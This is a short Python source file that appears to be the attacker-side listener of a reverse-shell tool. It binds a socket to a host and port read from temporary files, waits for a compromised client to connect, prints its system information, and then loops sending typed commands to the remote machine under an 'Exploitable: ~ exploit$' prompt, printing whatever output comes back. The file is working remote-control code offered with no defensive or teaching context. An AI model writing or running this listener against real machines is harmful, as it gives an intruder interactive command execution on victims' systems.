import helper
import socket

def listen():
  server = socket.socket()
  hostfile = open("tmp/host.data","r")
  HOST = hostfile.read()
  hostfile.close()
  portfile = open("tmp/port.data","r")
  PORT = int(portfile.read())
  portfile.close()
  server.bind((HOST, PORT))
  print('[+] Server Started')
  print(f'[+] Listening on {HOST}:{PORT}')
  server.listen(1)
  global client
  client, client_addr = server.accept()
  f = open("tmp/client.data","w")
  f.write(str(client))
  f.close()
  print(f'[+] {client_addr} Client connected to the server')
  return client



def reverse_shell():
    sysinfo = client.recv(1024)
    print(sysinfo)
    while True:
          command = input('Exploitable: ~ exploit$ ')
          command = command.encode()
          client.send(command)
          output = client.recv(1024)
          output = output.decode()
          print(f"Command Output: {output}")